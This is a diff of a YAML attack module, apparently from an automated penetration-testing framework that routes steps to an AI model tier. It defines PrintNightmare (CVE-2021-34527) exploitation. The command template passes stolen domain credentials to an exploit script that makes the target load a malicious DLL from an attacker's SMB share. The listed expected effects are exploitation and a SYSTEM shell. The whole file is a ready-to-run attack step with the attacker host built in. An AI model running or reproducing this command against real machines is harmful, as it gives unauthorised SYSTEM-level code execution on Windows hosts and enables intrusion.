@@ -2,16 +2,22 @@ name: printnightmare
 category: ad
 description: PrintNightmare exploitation (CVE-2021-34527)
 preconditions:
-  - os==windows
-  - has_cred
+- os==windows
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 CVE-2021-1675.py '{domain}/{username}:{password}@{target_ip}' '\\{attacker_ip}\share\malicious.dll'"
-parser: null
+command_template: 'python3 CVE-2021-1675.py ''{domain}/{username}:{password}@{target_ip}''
+  ''\\{attacker_ip}\share\malicious.dll''
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- printnightmare_exploited
+- system_shell
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Print Spooler RCE: load arbitrary DLL as SYSTEM via AddPrinterDriverEx. Requires: SMB share hosting DLL, valid creds (any domain user)."
+mechanism: 'Print Spooler RCE: load arbitrary DLL as SYSTEM via AddPrinterDriverEx.
+  Requires: SMB share hosting DLL, valid creds (any domain user).'
+hacktricks_ref: windows-hardening/active-directory-methodology/README.md
